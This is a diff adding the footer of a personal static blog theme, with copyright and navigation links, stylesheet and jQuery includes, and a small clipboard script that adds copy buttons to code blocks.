+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2019-2020
+    tcmal
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/archives/">Recent</a></li>
+         
+          <li><a href="https://github.com/tcmal" target="_blank" rel="noopener">GitHub</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
